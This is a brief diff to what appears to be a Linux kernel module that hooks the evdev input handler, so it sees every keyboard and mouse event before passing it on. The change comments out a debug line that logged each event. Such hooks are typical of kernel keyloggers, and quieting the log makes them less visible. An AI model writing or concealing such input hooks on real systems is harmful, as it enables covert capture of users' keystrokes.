@@ -132,7 +132,8 @@ static asmlinkage void hooked_evdev_events(struct input_handle *handle,
         if(user_count > 1024 || user_count < 0) {
             user_count = 0;
         }
-        kprint("Event #(%d): type: %d - code: %d - value: %d\n", i, vals[i].type, vals[i].code, vals[i].value);
+
+        // kprint("Event #(%d): type: %d - code: %d - value: %d\n", i, vals[i].type, vals[i].code, vals[i].value);
     }
     orig_evdev_events( handle, vals, count );
 }
